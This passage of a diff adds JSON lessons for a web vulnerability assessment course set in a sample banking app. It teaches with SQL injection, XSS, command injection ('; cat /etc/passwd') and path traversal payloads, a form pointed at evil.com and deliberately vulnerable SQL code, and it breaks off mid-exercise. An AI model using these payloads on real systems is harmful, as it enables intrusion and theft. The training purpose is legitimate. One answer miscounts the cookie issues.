+          "description": "Final report summary with severity breakdown",
+          "difficulty": "advanced",
+          "code": "import java.util.*;\n\npublic class AssessmentSummary {\n    static List<String[]> findings = new ArrayList<>();\n    \n    static void add(String name, String cwe, String sev, String status) {\n        findings.add(new String[]{name, cwe, sev, status});\n    }\n    \n    public static void main(String[] args) {\n        add(\"SQL Injection in Login\", \"CWE-89\", \"CRITICAL\", \"OPEN\");\n        add(\"Stored XSS in Profile\", \"CWE-79\", \"HIGH\", \"OPEN\");\n        add(\"CSRF on Fund Transfer\", \"CWE-352\", \"HIGH\", \"OPEN\");\n        add(\"Command Injection in Ping\", \"CWE-78\", \"CRITICAL\", \"OPEN\");\n        add(\"Path Traversal in Download\", \"CWE-22\", \"HIGH\", \"OPEN\");\n        add(\"Missing Session Expiry\", \"CWE-613\", \"MEDIUM\", \"OPEN\");\n        add(\"Directory Listing Enabled\", \"CWE-548\", \"MEDIUM\", \"OPEN\");\n        add(\"Verbose Error Messages\", \"CWE-209\", \"MEDIUM\", \"OPEN\");\n        add(\"Server Version Disclosure\", \"CWE-200\", \"LOW\", \"OPEN\");\n        add(\"Missing IDOR Check on Profile\", \"CWE-284\", \"HIGH\", \"OPEN\");\n        \n        System.out.println(\"=== VULNERABILITY ASSESSMENT SUMMARY ===\");\n        System.out.println(\"Application: Sample Banking App\");\n        System.out.println(\"Date: 2026-02-23\");\n        System.out.println(\"Total Findings: \" + findings.size() + \"\\n\");\n        \n        Map<String, Integer> sevCounts = new LinkedHashMap<>();\n        System.out.printf(\"%-4s %-35s %-8s %-10s %s%n\", \"#\", \"VULNERABILITY\", \"CWE\", \"SEVERITY\", \"STATUS\");\n        System.out.println(\"-\".repeat(75));\n        for (int i = 0; i < findings.size(); i++) {\n            String[] f = findings.get(i);\n            System.out.printf(\"%-4d %-35s %-8s %-10s %s%n\", i+1, f[0], f[1], f[2], f[3]);\n            sevCounts.merge(f[2], 1, Integer::sum);\n        }\n        \n        System.out.println(\"\\nSEVERITY BREAKDOWN:\");\n        sevCounts.forEach((s, c) -> System.out.println(\"  \" + s + \": \" + c));\n        \n        System.out.println(\"\\nPRIORITY REMEDIATION ORDER:\");\n        System.out.println(\"  1. Fix CRITICAL issues immediately (SQL injection, command injection)\");\n        System.out.println(\"  2. Fix HIGH issues this sprint (XSS, CSRF, path traversal, IDOR)\");\n        System.out.println(\"  3. Fix MEDIUM issues this month (session, directory listing, errors)\");\n        System.out.println(\"  4. Fix LOW issues in backlog (version disclosure)\");\n    }\n}",
+          "output": "=== VULNERABILITY ASSESSMENT SUMMARY ===\nApplication: Sample Banking App\nDate: 2026-02-23\nTotal Findings: 10\n\n#    VULNERABILITY                        CWE      SEVERITY   STATUS\n---------------------------------------------------------------------------\n1    SQL Injection in Login                CWE-89   CRITICAL   OPEN\n2    Stored XSS in Profile                 CWE-79   HIGH       OPEN\n3    CSRF on Fund Transfer                 CWE-352  HIGH       OPEN\n4    Command Injection in Ping             CWE-78   CRITICAL   OPEN\n5    Path Traversal in Download            CWE-22   HIGH       OPEN\n6    Missing Session Expiry                CWE-613  MEDIUM     OPEN\n7    Directory Listing Enabled             CWE-548  MEDIUM     OPEN\n8    Verbose Error Messages                CWE-209  MEDIUM     OPEN\n9    Server Version Disclosure             CWE-200  LOW        OPEN\n10   Missing IDOR Check on Profile         CWE-284  HIGH       OPEN\n\nSEVERITY BREAKDOWN:\n  CRITICAL: 2\n  HIGH: 4\n  MEDIUM: 3\n  LOW: 1\n\nPRIORITY REMEDIATION ORDER:\n  1. Fix CRITICAL immediately\n  2. Fix HIGH this sprint\n  3. Fix MEDIUM this month\n  4. Fix LOW in backlog",
+          "ai_explanation": "A professional assessment summary provides the complete picture at a glance: total findings, severity breakdown, and prioritised remediation order. Fix CRITICAL issues first (they can be exploited right now with devastating impact), then work down. This format is used by security consultancies worldwide.",
+          "ai_challenge": "If you could only fix 3 vulnerabilities this week, which would you choose and why?"
+        }
+      ],
+      "visual_diagram": {
+        "title": "Web Application Vulnerability Assessment: Complete Methodology",
+        "content": "<div style=\"font-family: monospace; line-height: 1.8;\"><span style=\"background: #e74c3c; color: white; padding: 6px 16px; border-radius: 6px; font-weight: bold;\">[VULNERABILITY ASSESSMENT METHODOLOGY]</span>\n\n<span style=\"background: #3498db; color: white; padding: 4px 12px; border-radius: 4px;\">PHASE 1</span> <span style=\"color: #3498db; font-weight: bold;\">RECONNAISSANCE</span>\n  <span style=\"color: #95a5a6;\">Browse the app, understand features, roles, and pages</span>\n  <span style=\"color: #95a5a6;\">Map: Login, Profile, Search, Transfer, Admin, Upload, Download</span>\n        |\n        v\n<span style=\"background: #2ecc71; color: white; padding: 4px 12px; border-radius: 4px;\">PHASE 2</span> <span style=\"color: #2ecc71; font-weight: bold;\">ATTACK SURFACE MAPPING</span>\n  <span style=\"color: #95a5a6;\">List ALL inputs: form fields, URL params, cookies, headers, files</span>\n  <span style=\"color: #95a5a6;\">Each input = potential attack vector to test</span>\n        |\n        v\n<span style=\"background: #f39c12; color: white; padding: 4px 12px; border-radius: 4px;\">PHASE 3</span> <span style=\"color: #f39c12; font-weight: bold;\">VULNERABILITY TESTING</span>\n  For each input, test:\n  <span style=\"background: #e74c3c; color: white; padding: 2px 8px; border-radius: 3px;\">SQLi</span> <span style=\"color: #e74c3c;\">' OR '1'='1 | 1 OR 1=1 | UNION SELECT</span>\n  <span style=\"background: #f39c12; color: white; padding: 2px 8px; border-radius: 3px;\">XSS</span>  <span style=\"color: #f39c12;\">&lt;script&gt;alert(1)&lt;/script&gt; | &lt;img onerror=alert(1)&gt;</span>\n  <span style=\"background: #9b59b6; color: white; padding: 2px 8px; border-radius: 3px;\">CSRF</span> <span style=\"color: #9b59b6;\">Check forms for anti-CSRF tokens</span>\n  <span style=\"background: #2ecc71; color: white; padding: 2px 8px; border-radius: 3px;\">CMDi</span> <span style=\"color: #2ecc71;\">; whoami | ls | && cat /etc/passwd</span>\n  <span style=\"background: #3498db; color: white; padding: 2px 8px; border-radius: 3px;\">PATH</span> <span style=\"color: #3498db;\">../../../etc/passwd | ..%2f encoding</span>\n  <span style=\"background: #1abc9c; color: white; padding: 2px 8px; border-radius: 3px;\">IDOR</span> <span style=\"color: #1abc9c;\">Change ?id=1 to ?id=2 | access other users data</span>\n  <span style=\"background: #95a5a6; color: white; padding: 2px 8px; border-radius: 3px;\">INFO</span> <span style=\"color: #95a5a6;\">Error messages, directory listings, comments, headers</span>\n        |\n        v\n<span style=\"background: #9b59b6; color: white; padding: 4px 12px; border-radius: 4px;\">PHASE 4</span> <span style=\"color: #9b59b6; font-weight: bold;\">EXPLOITATION & EVIDENCE</span>\n  <span style=\"color: #95a5a6;\">Confirm each finding is real (not a false positive)</span>\n  <span style=\"color: #95a5a6;\">Capture: payload used, server response, screenshots</span>\n        |\n        v\n<span style=\"background: #e67e22; color: white; padding: 4px 12px; border-radius: 4px;\">PHASE 5</span> <span style=\"color: #e67e22; font-weight: bold;\">CIA IMPACT ANALYSIS</span>\n  <span style=\"color: #e74c3c;\">Confidentiality:</span> Can attacker READ sensitive data?\n  <span style=\"color: #f39c12;\">Integrity:</span>       Can attacker MODIFY data?\n  <span style=\"color: #3498db;\">Availability:</span>    Can attacker DISRUPT the service?\n        |\n        v\n<span style=\"background: #2c3e50; color: white; padding: 4px 12px; border-radius: 4px;\">PHASE 6</span> <span style=\"color: #2c3e50; font-weight: bold;\">REPORT & REMEDIATION</span>\n  <span style=\"color: #95a5a6;\">For each finding: CWE ID, reproduction steps, evidence, CIA, fix</span>\n  <span style=\"color: #95a5a6;\">Prioritise: CRITICAL -> HIGH -> MEDIUM -> LOW</span>\n\n\n<span style=\"background: #2c3e50; color: white; padding: 6px 16px; border-radius: 6px; font-weight: bold;\">[CWE QUICK REFERENCE]</span>\n\n  <span style=\"background: #e74c3c; color: white; padding: 3px 8px; border-radius: 3px;\">CWE-89</span>  SQL Injection\n  <span style=\"background: #f39c12; color: white; padding: 3px 8px; border-radius: 3px;\">CWE-79</span>  Cross-Site Scripting (XSS)\n  <span style=\"background: #9b59b6; color: white; padding: 3px 8px; border-radius: 3px;\">CWE-352</span> Cross-Site Request Forgery (CSRF)\n  <span style=\"background: #2ecc71; color: white; padding: 3px 8px; border-radius: 3px;\">CWE-78</span>  OS Command Injection\n  <span style=\"background: #3498db; color: white; padding: 3px 8px; border-radius: 3px;\">CWE-22</span>  Path Traversal\n  <span style=\"background: #1abc9c; color: white; padding: 3px 8px; border-radius: 3px;\">CWE-284</span> Broken Access Control\n  <span style=\"background: #95a5a6; color: white; padding: 3px 8px; border-radius: 3px;\">CWE-200</span> Information Exposure\n  <span style=\"background: #e67e22; color: white; padding: 3px 8px; border-radius: 3px;\">CWE-434</span> Unrestricted File Upload\n\n\n<span style=\"background: #2ecc71; color: white; padding: 6px 16px; border-radius: 6px; font-weight: bold;\">[REMEMBER]</span>\n\n  <span style=\"color: #e74c3c; font-weight: bold;\">1.</span> Map EVERY input before testing anything\n  <span style=\"color: #f39c12; font-weight: bold;\">2.</span> Test each input with MULTIPLE payload types\n  <span style=\"color: #2ecc71; font-weight: bold;\">3.</span> CONFIRM exploits — no false positives in reports\n  <span style=\"color: #3498db; font-weight: bold;\">4.</span> Always assess CIA impact for prioritisation\n  <span style=\"color: #9b59b6; font-weight: bold;\">5.</span> Write REPRODUCIBLE steps — anyone must be able to follow\n  <span style=\"color: #e67e22; font-weight: bold;\">6.</span> Recommend SPECIFIC fixes, not just \"fix it\"\n</div>"
+      },
+      "practice_exercises": [
+        {
+          "exercise_id": "ex_01",
+          "title": "Exercise 1: Identify Input Points",
+          "description": "List all input points for a given web page description.",
+          "difficulty": "beginner",
+          "category": "Reconnaissance & Attack Surface",
+          "estimated_minutes": 4,
+          "ai_intro": "Let's start by finding where attackers can interact with the application!",
+          "starter_code": "// A banking app has these pages:\n// 1. /login - username field, password field\n// 2. /search?q=term - search bar\n// 3. /profile?id=5 - user profile\n// 4. /transfer - to_account field, amount field\n// 5. /download?file=report.pdf - file download\n//\n// List every INPUT POINT (field or parameter):\n// Format: page | input_name | input_type | test_for\n// Example: /login | username | form_field | SQLi, XSS",
+          "expected_output": "/login | username | form_field | SQLi, XSS\n/login | password | form_field | SQLi\n/search | q | query_param | XSS, SQLi\n/profile | id | query_param | IDOR, SQLi\n/transfer | to_account | form_field | CSRF, SQLi\n/transfer | amount | form_field | CSRF, integer overflow\n/download | file | query_param | path traversal",
+          "hints": [
+            {
+              "message": "Every field a user can type in or every parameter in a URL is an input point."
+            },
+            {
+              "message": "Look at each page: what can you change? Form fields, URL parameters, file names."
+            },
+            {
+              "message": "7 inputs: username, password, q, id, to_account, amount, file. Each maps to specific tests."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_02",
+          "title": "Exercise 2: Classify Vulnerability Types",
+          "description": "Match each attack description to its correct CWE.",
+          "difficulty": "beginner",
+          "category": "Reconnaissance & Attack Surface",
+          "estimated_minutes": 3,
+          "ai_intro": "Knowing which CWE matches which attack is fundamental!",
+          "starter_code": "// Match each scenario to its CWE:\n// CWE-89, CWE-79, CWE-352, CWE-78, CWE-22, CWE-200, CWE-284\n//\n// 1. Entering ' OR 1=1 in login bypasses authentication: CWE-___\n// 2. <script>alert(1)</script> in search shows an alert: CWE-___\n// 3. Hidden form auto-submits a transfer request: CWE-___\n// 4. Appending ; whoami to a ping input shows username: CWE-___\n// 5. Using ../../etc/passwd reads system files: CWE-___\n// 6. Error page shows full stack trace with file names: CWE-___\n// 7. Normal user accesses /admin without being admin: CWE-___",
+          "expected_output": "1. CWE-89 (SQL Injection)\n2. CWE-79 (XSS)\n3. CWE-352 (CSRF)\n4. CWE-78 (Command Injection)\n5. CWE-22 (Path Traversal)\n6. CWE-200 (Information Exposure)\n7. CWE-284 (Broken Access Control)",
+          "hints": [
+            {
+              "message": "89=SQL, 79=XSS, 352=CSRF, 78=command, 22=path, 200=info, 284=access."
+            },
+            {
+              "message": "Match the attack technique to the weakness type."
+            },
+            {
+              "message": "1.89 2.79 3.352 4.78 5.22 6.200 7.284"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_03",
+          "title": "Exercise 3: Prioritise Testing Targets",
+          "description": "Rank which endpoints to test first based on risk.",
+          "difficulty": "beginner",
+          "category": "Reconnaissance & Attack Surface",
+          "estimated_minutes": 4,
+          "ai_intro": "Not all inputs are equal. Some can cause much more damage!",
+          "starter_code": "// Rank these endpoints from HIGHEST to LOWEST priority for testing:\n// A. /about - static company information page (no inputs)\n// B. /login - username and password form\n// C. /transfer - send money to another account\n// D. /search?q= - search the site\n// E. /admin/users - manage all user accounts\n// F. /contact - send a message form\n//\n// Write your ranking (highest first): ___",
+          "expected_output": "Ranking: C, E, B, D, F, A\nC (transfer) - financial impact, state-changing\nE (admin) - full system access if compromised\nB (login) - authentication bypass = total access\nD (search) - reflected XSS possible\nF (contact) - stored XSS possible but lower impact\nA (about) - no inputs, no risk",
+          "hints": [
+            {
+              "message": "Prioritise by: what is the WORST thing that can happen if this is exploited?"
+            },
+            {
+              "message": "Financial actions (transfer) and admin functions have highest impact. Static pages have none."
+            },
+            {
+              "message": "C>E>B>D>F>A. Transfer and admin are critical. Login enables everything. Search/contact are lower."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_04",
+          "title": "Exercise 4: Map HTTP Methods",
+          "description": "Identify which HTTP methods are used and their security implications.",
+          "difficulty": "beginner",
+          "category": "Reconnaissance & Attack Surface",
+          "estimated_minutes": 3,
+          "ai_intro": "Understanding HTTP methods helps you know which requests change data!",
+          "starter_code": "// For each action, write GET or POST and whether it's STATE-CHANGING:\n// 1. Viewing a user profile: ___ / state-changing: ___\n// 2. Transferring funds: ___ / state-changing: ___\n// 3. Searching for products: ___ / state-changing: ___\n// 4. Updating your password: ___ / state-changing: ___\n// 5. Downloading a file: ___ / state-changing: ___\n// 6. Deleting an account: ___ / state-changing: ___",
+          "expected_output": "1. GET / No\n2. POST / Yes\n3. GET / No\n4. POST / Yes\n5. GET / No\n6. POST (or DELETE) / Yes",
+          "hints": [
+            {
+              "message": "GET reads data. POST/PUT/DELETE change data. State-changing = modifies something on the server."
+            },
+            {
+              "message": "Viewing and searching are GET (read-only). Transfers, updates, deletes are POST (modify)."
+            },
+            {
+              "message": "1.GET/No 2.POST/Yes 3.GET/No 4.POST/Yes 5.GET/No 6.POST/Yes"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_05",
+          "title": "Exercise 5: Identify User Roles",
+          "description": "Map application roles and their intended permissions.",
+          "difficulty": "beginner",
+          "category": "Reconnaissance & Attack Surface",
+          "estimated_minutes": 4,
+          "ai_intro": "Understanding roles helps you test for privilege escalation!",
+          "starter_code": "// A banking app has two roles. Map their intended permissions:\n// Admin: Can manage profiles, transfer funds, view ALL user details\n// Normal User: Can view/manage OWN profile, transfer funds\n//\n// For each action, write who should have access:\n// 1. View own profile: ___\n// 2. View other users' card numbers: ___\n// 3. Transfer own funds: ___\n// 4. View all user list: ___\n// 5. Delete a user account: ___\n// 6. Change own password: ___",
+          "expected_output": "1. Both (Admin + Normal User)\n2. Admin only\n3. Both\n4. Admin only\n5. Admin only\n6. Both",
+          "hints": [
+            {
+              "message": "Normal users should only manage their OWN data. Admins can see and manage everything."
+            },
+            {
+              "message": "Actions involving OTHER users' data or system management = admin only."
+            },
+            {
+              "message": "1.Both 2.Admin 3.Both 4.Admin 5.Admin 6.Both"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_06",
+          "title": "Exercise 6: Cookie Inspection",
+          "description": "Examine cookies for security attribute issues.",
+          "difficulty": "beginner",
+          "category": "Reconnaissance & Attack Surface",
+          "estimated_minutes": 4,
+          "ai_intro": "Cookies are a key part of the attack surface!",
+          "starter_code": "// Inspect these cookies and mark each attribute as PRESENT or MISSING:\n// Cookie: session=abc123; Path=/\n//\n// HttpOnly: ___ (prevents JavaScript access)\n// Secure: ___ (HTTPS only)\n// SameSite: ___ (CSRF protection)\n// Expiry/Max-Age: ___ (when does it expire?)\n//\n// How many security issues did you find? ___",
+          "expected_output": "HttpOnly: MISSING (JavaScript can steal this cookie!)\nSecure: MISSING (sent over plain HTTP!)\nSameSite: MISSING (vulnerable to CSRF!)\nExpiry/Max-Age: MISSING (session cookie, deleted on browser close)\n\n3 security issues (HttpOnly, Secure, SameSite all missing)",
+          "hints": [
+            {
+              "message": "Compare the cookie against the four security attributes."
+            },
+            {
+              "message": "The cookie only has session=abc123 and Path=/. All security flags are missing."
+            },
+            {
+              "message": "3 issues: HttpOnly, Secure, SameSite all missing. Each creates a different risk."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_07",
+          "title": "Exercise 7: Error Response Analysis",
+          "description": "Examine error messages for information leakage.",
+          "difficulty": "beginner",
+          "category": "Reconnaissance & Attack Surface",
+          "estimated_minutes": 3,
+          "ai_intro": "Error messages can reveal a lot about the application's internals!",
+          "starter_code": "// Analyse this error response and list what information is leaked:\n//\n// HTTP 500 Internal Server Error\n// java.sql.SQLException: You have an error in your SQL syntax;\n// check the manual for MySQL server version 5.7\n// Query: SELECT * FROM users WHERE id='admin''\n// at com.bank.DBHelper.executeQuery(DBHelper.java:42)\n// at com.bank.LoginServlet.doPost(LoginServlet.java:28)\n//\n// Information leaked:\n// 1. ___\n// 2. ___\n// 3. ___\n// 4. ___\n// 5. ___",
+          "expected_output": "1. Programming language: Java\n2. Database type: MySQL version 5.7\n3. Table name: users\n4. Column name: id\n5. File names and line numbers: DBHelper.java:42, LoginServlet.java:28\n\nBonus: Query structure, package name (com.bank), confirms SQL injection possible",
+          "hints": [
+            {
+              "message": "Look at every piece of information an attacker could use."
+            },
+            {
+              "message": "Language, database type+version, table/column names, file names, line numbers, query structure."
+            },
+            {
+              "message": "5+ items: Java, MySQL 5.7, 'users' table, 'id' column, DBHelper.java:42, LoginServlet.java:28"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_08",
+          "title": "Exercise 8: Hidden Input Discovery",
+          "description": "Find security-relevant hidden fields in page source.",
+          "difficulty": "beginner",
+          "category": "Reconnaissance & Attack Surface",
+          "estimated_minutes": 4,
+          "ai_intro": "Always view page source! Hidden fields can be manipulated!",
+          "starter_code": "// This HTML contains hidden inputs. Identify security-relevant ones:\n//\n// <form action='/transfer' method='POST'>\n//   <input type='hidden' name='fromAccount' value='12345'>\n//   <input type='hidden' name='role' value='user'>\n//   <input type='hidden' name='isAdmin' value='false'>\n//   <input type='text' name='toAccount'>\n//   <input type='text' name='amount'>\n//   <button>Transfer</button>\n// </form>\n//\n// Which hidden fields could an attacker manipulate? What attack?\n// 1. ___\n// 2. ___\n// 3. ___",
+          "expected_output": "1. fromAccount (value=12345) - Change to another user's account to transfer THEIR money\n2. role (value=user) - Change to 'admin' for privilege escalation\n3. isAdmin (value=false) - Change to 'true' for admin access\n\nAll three can be changed with browser DevTools or intercepting proxy!",
+          "hints": [
+            {
+              "message": "Hidden fields are NOT secure. Users can change them with DevTools."
+            },
+            {
+              "message": "fromAccount could be changed to steal from others. role and isAdmin control permissions."
+            },
+            {
+              "message": "All three: fromAccount (IDOR), role (privilege escalation), isAdmin (access control bypass)."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_09",
+          "title": "Exercise 9: Identify Test Payloads",
+          "description": "Select the right payload for each vulnerability type.",
+          "difficulty": "beginner",
+          "category": "Reconnaissance & Attack Surface",
+          "estimated_minutes": 3,
+          "ai_intro": "Different vulnerabilities need different test payloads!",
+          "starter_code": "// Match each payload to the vulnerability it tests:\n// A. ' OR '1'='1' --\n// B. <script>alert(1)</script>\n// C. ; cat /etc/passwd\n// D. ../../../etc/passwd\n// E. <form action='http://evil.com'>\n//\n// 1. SQL Injection: ___\n// 2. XSS: ___\n// 3. Command Injection: ___\n// 4. Path Traversal: ___\n// 5. CSRF (testing): ___",
+          "expected_output": "1. SQL Injection: A (' OR '1'='1' --)\n2. XSS: B (<script>alert(1)</script>)\n3. Command Injection: C (; cat /etc/passwd)\n4. Path Traversal: D (../../../etc/passwd)\n5. CSRF: E (external form submission)",
+          "hints": [
+            {
+              "message": "Each payload exploits a specific parsing or handling weakness."
+            },
+            {
+              "message": "SQL uses quotes, XSS uses HTML tags, command uses shell operators, path uses ../, CSRF uses external forms."
+            },
+            {
+              "message": "A=SQLi, B=XSS, C=CMDi, D=Path, E=CSRF"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_10",
+          "title": "Exercise 10: Normal vs Attack Behaviour",
+          "description": "Distinguish normal application behaviour from exploit behaviour.",
+          "difficulty": "beginner",
+          "category": "Reconnaissance & Attack Surface",
+          "estimated_minutes": 4,
+          "ai_intro": "Understanding normal behaviour is ESSENTIAL before testing attacks!",
+          "starter_code": "// For each scenario, write NORMAL or ATTACK:\n// 1. Login with admin/adminPassword -> Welcome admin: ___\n// 2. Login with admin' OR '1'='1' -- / anything -> Welcome admin: ___\n// 3. Search for 'laptop' -> shows laptop results: ___\n// 4. Search for '<script>alert(1)</script>' -> alert box appears: ___\n// 5. View /profile?id=1 (your own ID) -> shows your profile: ___\n// 6. View /profile?id=2 (other user) -> shows their profile: ___\n// 7. Transfer $100 to a friend -> confirmation page: ___\n// 8. /download?file=../../etc/passwd -> shows system file: ___",
+          "expected_output": "1. NORMAL - correct credentials\n2. ATTACK - SQL injection bypass\n3. NORMAL - legitimate search\n4. ATTACK - XSS execution\n5. NORMAL - viewing own data\n6. ATTACK - IDOR accessing other's data\n7. NORMAL - intended functionality\n8. ATTACK - path traversal",
+          "hints": [
+            {
+              "message": "Normal = the application working as designed. Attack = unexpected behaviour from crafted input."
+            },
+            {
+              "message": "If the input contains special characters that change the app's logic, it's an attack."
+            },
+            {
+              "message": "1.NORMAL 2.ATTACK 3.NORMAL 4.ATTACK 5.NORMAL 6.ATTACK 7.NORMAL 8.ATTACK"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_11",
+          "title": "Exercise 11: Detect SQLi with Single Quote",
+          "description": "Test if a login form is vulnerable to SQL injection.",
+          "difficulty": "intermediate",
+          "category": "SQL Injection Testing",
+          "estimated_minutes": 5,
+          "ai_intro": "SQL injection is still the #1 database attack. Let's find it!",
+          "starter_code": "public class SQLiDetect {\n    static String testLogin(String input) {\n        String query = \"SELECT * FROM users WHERE name='\" + input + \"'\";\n        // TODO: Check if single quote causes syntax issue\n        // Return: \"LIKELY VULNERABLE\" if input contains unescaped '\n        // Return: \"APPEARS SAFE\" otherwise\n        return \"\";\n    }\n    public static void main(String[] args) {\n        System.out.println(testLogin(\"admin\"));\n        System.out.println(testLogin(\"admin'\"));\n        System.out.println(testLogin(\"admin' OR '1'='1\"));\n    }\n}",
+          "expected_output": "APPEARS SAFE\nLIKELY VULNERABLE\nLIKELY VULNERABLE",
+          "hints": [
+            {
+              "message": "If the input contains a single quote and the query uses string concatenation, it's likely vulnerable."
+            },
+            {
+              "message": "Check if input contains ' AND the query uses concatenation (not prepared statements)."
+            },
+            {
+              "message": "if(input.contains(\"'\")) return \"LIKELY VULNERABLE\"; else return \"APPEARS SAFE\";"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_12",
+          "title": "Exercise 12: Build SQL Injection Payloads",
+          "description": "Create payloads for different SQL injection scenarios.",
+          "difficulty": "intermediate",
+          "category": "SQL Injection Testing",
+          "estimated_minutes": 5,
+          "ai_intro": "SQL injection is still the #1 database attack. Let's find it!",
+          "starter_code": "public class SQLiPayloads {\n    // TODO: Complete each payload for the given scenario\n    public static void main(String[] args) {\n        // 1. Bypass login (make WHERE always true):\n        String bypass = \"\"; // admin' OR '1'='1' --\n        \n        // 2. Extract all usernames (UNION):\n        String extract = \"\"; // ' UNION SELECT username,password FROM users --\n        \n        // 3. Bypass numeric filter (no quotes needed):\n        String numeric = \"\"; // 1 OR 1=1\n        \n        // 4. Time-based blind (detect without output):\n        String blind = \"\"; // ' OR SLEEP(5) --\n        \n        System.out.println(\"Bypass: \" + bypass);\n        System.out.println(\"Extract: \" + extract);\n        System.out.println(\"Numeric: \" + numeric);\n        System.out.println(\"Blind: \" + blind);\n    }\n}",
+          "expected_output": "Bypass: admin' OR '1'='1' --\nExtract: ' UNION SELECT username,password FROM users --\nNumeric: 1 OR 1=1\nBlind: ' OR SLEEP(5) --",
+          "hints": [
+            {
+              "message": "Each scenario needs a different payload technique."
+            },
+            {
+              "message": "Bypass uses OR true. UNION extracts from other columns. Numeric has no quotes. Blind uses time delay."
+            },
+            {
+              "message": "bypass=\"admin' OR '1'='1' --\", extract=\"' UNION SELECT username,password FROM users --\", numeric=\"1 OR 1=1\", blind=\"' OR SLEEP(5) --\""
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_13",
+          "title": "Exercise 13: Fix SQL Injection",
+          "description": "Refactor vulnerable code to use PreparedStatement.",
+          "difficulty": "intermediate",
+          "category": "SQL Injection Testing",
+          "estimated_minutes": 5,
+          "ai_intro": "SQL injection is still the #1 database attack. Let's find it!",
+          "starter_code": "import java.sql.*;\n\npublic class FixSQLi {\n    // VULNERABLE:\n    static String vulnerable(Connection conn, String user, String pass) throws Exception {\n        String q = \"SELECT * FROM users WHERE username='\" + user + \"' AND password='\" + pass + \"'\";\n        Statement st = conn.createStatement();\n        ResultSet rs = st.executeQuery(q);\n        return rs.next() ? \"LOGIN SUCCESS\" : \"LOGIN FAILED\";\n    }\n    \n    // TODO: Fix using PreparedStatement\n    static String fixed(Connection conn, String user, String pass) throws Exception {\n        return \"\";\n    }\n}",
+          "expected_output": "PreparedStatement ps = conn.prepareStatement(\n  \"SELECT * FROM users WHERE username=? AND password=?\");\nps.setString(1, user);\nps.setString(2, pass);\nResultSet rs = ps.executeQuery();\nreturn rs.next() ? \"LOGIN SUCCESS\" : \"LOGIN FAILED\";",
+          "hints": [
+            {
+              "message": "Replace string concatenation with ? placeholders and setString()."
+            },
+            {
+              "message": "PreparedStatement ps = conn.prepareStatement(\"SELECT...WHERE username=? AND password=?\"); ps.setString(1,user); ps.setString(2,pass);"
+            },
+            {
+              "message": "Full fix: PreparedStatement with ? for both parameters, setString for each, executeQuery on ps."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_14",
+          "title": "Exercise 14: String vs Numeric SQLi",
+          "description": "Identify whether an injection point is string or numeric.",
+          "difficulty": "intermediate",
+          "category": "SQL Injection Testing",
+          "estimated_minutes": 5,
+          "ai_intro": "SQL injection is still the #1 database attack. Let's find it!",
+          "starter_code": "public class StringVsNumeric {\n    // TODO: For each query, write the correct payload type\n    public static void main(String[] args) {\n        // Query 1: SELECT * FROM users WHERE name='\" + input + \"'\n        // Payload type: ___ (string/numeric)\n        // Example payload: ___\n        \n        // Query 2: SELECT * FROM products WHERE id=\" + input\n        // Payload type: ___ (string/numeric)\n        // Example payload: ___\n        \n        // Query 3: SELECT * FROM orders WHERE status='\" + input + \"' AND user_id=\" + userId\n        // How many injection points? ___\n        System.out.println(\"Q1: String, payload: ' OR '1'='1\");\n        System.out.println(\"Q2: Numeric, payload: 1 OR 1=1\");\n        System.out.println(\"Q3: Two injection points (string and numeric)\");\n    }\n}",
+          "expected_output": "Q1: String, payload: ' OR '1'='1\nQ2: Numeric, payload: 1 OR 1=1\nQ3: Two injection points (string and numeric)",
+          "hints": [
+            {
+              "message": "If the input is wrapped in quotes in the query, it's string injection. If not, numeric."
+            },
+            {
+              "message": "String: need to close the quote first. Numeric: no quotes needed, just add OR 1=1."
+            },
+            {
+              "message": "Q1=string (quoted), Q2=numeric (no quotes), Q3=both (two separate concatenations)."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_15",
+          "title": "Exercise 15: SQL Injection Impact Assessment",
+          "description": "Assess what an attacker can do after SQLi.",
+          "difficulty": "intermediate",
+          "category": "SQL Injection Testing",
+          "estimated_minutes": 5,
+          "ai_intro": "SQL injection is still the #1 database attack. Let's find it!",
+          "starter_code": "public class SQLiImpact {\n    // TODO: For each SQL injection scenario, rate CIA impact\n    public static void main(String[] args) {\n        System.out.println(\"Scenario 1: Attacker reads all user records\");\n        System.out.println(\"  C:___ I:___ A:___\"); // HIGH, LOW, LOW\n        \n        System.out.println(\"Scenario 2: Attacker uses UPDATE to change passwords\");\n        System.out.println(\"  C:___ I:___ A:___\"); // LOW, HIGH, LOW\n        \n        System.out.println(\"Scenario 3: Attacker uses DROP TABLE users\");\n        System.out.println(\"  C:___ I:___ A:___\"); // LOW, HIGH, HIGH\n        \n        System.out.println(\"Scenario 4: Full SQLi with all capabilities\");\n        System.out.println(\"  C:___ I:___ A:___\"); // HIGH, HIGH, HIGH\n    }\n}",
+          "expected_output": "Scenario 1: C:HIGH I:LOW A:LOW\nScenario 2: C:LOW I:HIGH A:LOW\nScenario 3: C:LOW I:HIGH A:HIGH\nScenario 4: C:HIGH I:HIGH A:HIGH",
+          "hints": [
+            {
+              "message": "C=read data, I=modify data, A=disrupt service."
+            },
+            {
+              "message": "Reading=confidentiality. Changing passwords=integrity. Dropping tables=integrity+availability."
+            },
+            {
+              "message": "1.H/L/L 2.L/H/L 3.L/H/H 4.H/H/H"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_16",
+          "title": "Exercise 16: Detect Blind SQL Injection",
+          "description": "Identify SQLi when there are no visible error messages.",
+          "difficulty": "intermediate",
+          "category": "SQL Injection Testing",
+          "estimated_minutes": 5,
+          "ai_intro": "SQL injection is still the #1 database attack. Let's find it!",
